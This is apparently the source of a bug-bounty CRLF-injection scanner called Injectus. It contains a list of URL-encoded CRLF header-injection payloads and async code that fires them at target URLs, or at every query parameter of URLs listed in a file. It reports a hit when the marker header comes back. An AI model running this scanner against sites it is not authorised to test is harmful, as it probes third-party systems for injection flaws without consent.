#!/usr/bin/env python3.7

import argparse
import asyncio
import logging
import re
import sys
import time

from multiprocessing import Pool, Process, JoinableQueue
from urllib.parse import urlsplit, urlunsplit
from pathlib import Path

try:
    import aiohttp
except ImportError:
    print("aiohttp is required, run pip3 install aiohttp --user")
    print("aiodns is required, run pip3 install aiodns --user")
    quit()

banner = '''
'####:'##::: ##:::::::'##:'########::'######::'########:'##::::'##::'######::
. ##:: ###:: ##::::::: ##: ##.....::'##... ##:... ##..:: ##:::: ##:'##... ##:
: ##:: ####: ##::::::: ##: ##::::::: ##:::..::::: ##:::: ##:::: ##: ##:::..::
: ##:: ## ## ##::::::: ##: ######::: ##:::::::::: ##:::: ##:::: ##:. ######::
: ##:: ##. ####:'##::: ##: ##...:::: ##:::::::::: ##:::: ##:::: ##::..... ##:
: ##:: ##:. ###: ##::: ##: ##::::::: ##::: ##:::: ##:::: ##:::: ##:'##::: ##:
'####: ##::. ##:. ######:: ########:. ######::::: ##::::. #######::. ######::
....::..::::..:::......:::........:::......::::::..::::::.......::::......:::
'''

crlf_payloads = [
    "%0d%0abounty:strike",
    "%0abounty:strike",
    "%0dbounty:strike",
    "%23%0dbounty:strike",
    "%3f%0dbounty:strike",
    "%250abounty:strike",
    "%25250abounty:strike",
    "%%0a0abounty:strike",
    "%3f%0dbounty:strike",
    "%23%0dbounty:strike",
    "%25%30abounty:strike",
    "%25%30%61bounty:strike",
    "%u000abounty:strike",
]
'''
TODO:
* Create a simple module system
    - One module that does CRLF/Header Injection
    - One that checks for open redirect
    - ...
* Worker gets an item from queue. The item can
  can be a dict containing which module should
  check for vulnerability in the response, e.g.
  {
      "url": "https://vuln.com/?t=%0d%0hax:inj",
      "type":"CRLF"
  }
  A simple switch case could run the correct
  module on the response.

    def check_crlf():
        if "bounty" in resp.headers.keys():
            print(f"[{name}] CRLF Injection detected: {url}")
        else:
            print(f'[{name}] injecting {url} [FALSE]')

    def check_location():
        if resp.headers["Location"] == "bountystrike.io":
            print(f"[+] Open Redirect detected: {url}")
'''


def injecter(url):
    
    regex = re.compile(r"\w=([\w\-\.]+)&*")

    f = regex.findall(url)
    u = urlsplit(url)
    attacks= []
    if urlsplit(url).query:
        query = urlsplit(url).query

        # sniper
        for payload in crlf_payloads:
            for p in f:
                attacks.append(query.replace(f"={p}", f"={payload}"))

        injected_queries = list(set(attacks))
        for query in injected_queries:
            injected_url = urlunsplit(u._replace(query=query))
            yield injected_url
 
    else:
        for payload in crlf_payloads:
            if not url.endswith("/"):
                injected_url = f"{url}/{payload}"
            else:
                injected_url = f"{url}{payload}"

            yield injected_url

async def worker(name: str, queue, session):
    while True:
        try:
            url = await queue.get()
        except asyncio.QueueEmpty:
            break

        if url is None:
            break

        try:
            async with session.get(url) as resp:
                if "bounty" in resp.headers.keys():
                    print(f"[{name}] CRLF Injection detected: {url}")
                else:
                    print(f'[{name}] injecting {url} [FALSE]')
        except asyncio.TimeoutError:
            print(f"[ERROR][{name}] timed out when attacking {url}...")
            queue.task_done()
            continue
        except Exception as e:
            print("[ERROR] Something went wrong...")
            print(e)
            queue.task_done()
            continue
  
        queue.task_done()



async def start(args):
    filename = args.file
    workers = args.workers
    url = args.url
    async_queue = asyncio.Queue()

    if url:
        for payload in crlf_payloads:
            u = f"{url}/{payload}"
            async_queue.put_nowait(u)
    else:
        with open(f"{filename}", "r") as f:

            for domain in f.readlines():
                domain = domain.replace("\n", "")
                for inject in injecter(domain):
                    if args.no_request:
                        print(inject)
                    else:
                        async_queue.put_nowait(inject)

    if not args.no_request:
        # Create workers
        size = async_queue.qsize()
        tasks = []
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=4))
        for i in range(workers):
            task = asyncio.create_task(worker(f'worker-{i}', async_queue, session))
            tasks.append(task)

        # Wait until the queue is fully processed.
        started_at = time.monotonic()
        await async_queue.join()
        time_ended = time.monotonic() - started_at

        # Cancel our worker tasks.
        for task in tasks:
            task.cancel()
        await session.close()
        # Wait until all worker tasks are cancelled.
        await asyncio.gather(*tasks, return_exceptions=True)

        print('=====================================')
        print(f"Processing time: {time_ended} seconds")
        print(f"Total URLs proccessed {size}")


def main():
    parser = argparse.ArgumentParser(prog="Injectus", description="Brute force CRLF and open redirect payloads for a given target. Crafted by @dubs3c.")
    parser.add_argument("-f", "--file", action="store", dest="file", help="File containing URLs")
    parser.add_argument("-u", "--url", action="store", dest="url", help="Single URL to test")
    parser.add_argument("-d", "--debug", action="store_true", help="Show debugging information")
    parser.add_argument("-r", "--no-request", action="store_true", dest="no_request", help="Only build attack list, do not perform any requests")
    parser.add_argument("-w", "--workers", type=int, default=10, dest="workers", action="store", help="Amount of asyncio workers, default is 10")
    args = parser.parse_args()

    if len(sys.argv) == 1:
        print(banner)
        parser.print_help()
        quit()

    if not args.url and not Path.exists(Path(args.file).resolve()):
        print(f"{args.file} does not exist")
        quit()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.url and args.file:
        print("Can't specify both -u and -f, choose one!")
        quit()

    asyncio.run(start(args))

if __name__ == "__main__":
    main()